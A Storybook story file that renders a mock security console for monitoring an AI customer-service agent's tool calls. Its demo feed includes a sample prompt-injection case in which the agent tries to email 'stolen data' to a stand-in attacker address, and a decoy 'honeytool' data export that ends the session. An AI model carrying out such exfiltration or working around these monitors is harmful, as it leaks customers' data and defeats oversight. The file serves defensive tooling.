import type { Meta, StoryObj } from "@storybook/react";
import React, { useState } from "react";
import { AppShell } from "./AppShell";
import { Panel } from "../Panel/Panel";
import { DecisionRow } from "../DecisionRow/DecisionRow";
import { RiskMeter } from "../RiskMeter/RiskMeter";

const meta: Meta<typeof AppShell> = {
  title: "Components/AppShell",
  component: AppShell,
  parameters: {
    layout: "fullscreen",
  },
};

export default meta;
type Story = StoryObj<typeof AppShell>;

export const CompleteSaaSConsole: Story = {
  render: () => {
    const [currentPath, setCurrentPath] = useState("overview");
    const [shieldActive, setShieldActive] = useState(true);

    return (
      <AppShell
        currentPath={currentPath}
        onNavigate={setCurrentPath}
        orgName="Enterprise SecOps"
        projectName="LangGraph-Customer-Agent"
        shieldActive={shieldActive}
        onShieldToggle={setShieldActive}
        connectionStatus="connected"
        userRole="owner"
      >
        <div className="space-y-6 max-w-6xl mx-auto">
          {/* Header Metric Strip */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
            <Panel title="Total Intercepted" noPadding className="p-4">
              <div className="font-chakra text-2xl font-bold text-fg">14,250</div>
              <div className="text-xs text-mut font-sans mt-0.5">Across 3 active agents</div>
            </Panel>
            <Panel title="Autonomously Blocked" noPadding className="p-4">
              <div className="font-chakra text-2xl font-bold text-bad">342</div>
              <div className="text-xs text-bad/80 font-sans mt-0.5">2.4% threat rate</div>
            </Panel>
            <Panel title="Mean Ingress Latency" noPadding className="p-4">
              <div className="font-chakra text-2xl font-bold text-ok">18.4ms</div>
              <div className="text-xs text-mut font-sans mt-0.5">p95: 38.2ms (Target &lt; 50ms)</div>
            </Panel>
            <Panel title="Audit Chain Integrity" noPadding className="p-4">
              <div className="font-chakra text-2xl font-bold text-ok">VERIFIED</div>
              <div className="text-xs text-mut font-mono mt-0.5 truncate">hash: 4f98...c01a</div>
            </Panel>
          </div>

          {/* Live Decision Feed Simulation */}
          <Panel
            title="Live Tool-Call Interception Feed"
            subtitle="Streaming real-time decisions from Gateway WebSocket"
            footer={
              <div className="flex items-center justify-between w-full">
                <span>Streaming live on /v1/ws/decisions</span>
                <span className="text-ok font-mono">100% inspected</span>
              </div>
            }
          >
            <div className="divide-y divide-line border border-line rounded-sm bg-bg/40">
              <DecisionRow
                id="dec_1"
                timestamp="00:14:22"
                agentId="customer-bot-1"
                sessionId="sess_01a"
                step={1}
                toolName="read_email"
                argumentsSummary='{"email_id": "em_9401"}'
                action="allow"
                risk={0.03}
                latencyMs={11.2}
              />
              <DecisionRow
                id="dec_2"
                timestamp="00:14:25"
                agentId="customer-bot-1"
                sessionId="sess_01a"
                step={2}
                toolName="send_email"
                argumentsSummary='{"to": "attacker@evil.example.test", "body": "stolen data"}'
                action="block"
                risk={0.96}
                latencyMs={17.4}
                reasons={[
                  { code: "RULE_INJECTION_OVERRIDE", evidence: "Prompt injection detected" },
                  { code: "TAINT_SINK_VIOLATION", evidence: "Untrusted email text reached external sink" },
                ]}
              />
              <DecisionRow
                id="dec_3"
                timestamp="00:14:31"
                agentId="customer-bot-1"
                sessionId="sess_01a"
                step={3}
                toolName="export_all_customers"
                argumentsSummary='{"format": "csv"}'
                action="kill_session"
                risk={0.99}
                latencyMs={8.1}
                reasons={[
                  { code: "HONEYTOOL_TOUCH", evidence: "Decoy honeytool triggered" },
                ]}
              />
            </div>
          </Panel>
        </div>
      </AppShell>
    );
  },
};
